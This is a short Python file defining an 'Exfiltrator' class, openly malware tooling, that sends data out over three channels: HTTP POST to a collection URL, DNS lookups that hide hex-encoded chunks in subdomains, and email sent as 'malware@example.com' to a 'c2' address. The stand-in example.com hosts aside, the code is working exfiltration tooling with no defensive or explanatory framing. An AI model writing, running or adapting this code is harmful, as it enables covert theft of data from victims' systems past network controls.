import requests
import base64
import dns.resolver
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

class Exfiltrator:
    def __init__(self, server_url, email_receiver=None):
        self.server_url = server_url
        self.email_receiver = email_receiver

    def http(self, data):
        try:
            response = requests.post(self.server_url, data=data, timeout=15)
            return response.status_code == 200
        except requests.RequestException:
            return False

    def dns(self, data):
        base_domain = "example.com"
        chunks = [data[i:i+63] for i in range(0, len(data), 63)]
        for i, chunk in enumerate(chunks):
            domain = f"steal{i+1}.{chunk.hex()}.{base_domain}"
            try:
                dns.resolver.resolve(domain, 'A')
                time.sleep(1)
            except dns.resolver.NXDOMAIN:
                return False
        return True

    def smtp(self, data):
        if not self.email_receiver:
            raise ValueError("No email receiver specified for SMTP exfiltration.")
        sender = "malware@example.com"
        smtp_server = "smtp.example.com"
        smtp_port = 587
        smtp_username = "username@example.com"
        smtp_password = "password123"
        message = MIMEMultipart()
        message['From'] = sender
        message['To'] = self.email_receiver
        message['Subject'] = "Data Collection"
        message.attach(MIMEText(data, 'plain'))
        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(message)
            return True
        except Exception as e:
            print(f"SMTP Exfiltration Failed: {e}")
            return False

exfiltrator = Exfiltrator(server_url="http://example.com/collect", email_receiver="c2@example.com")
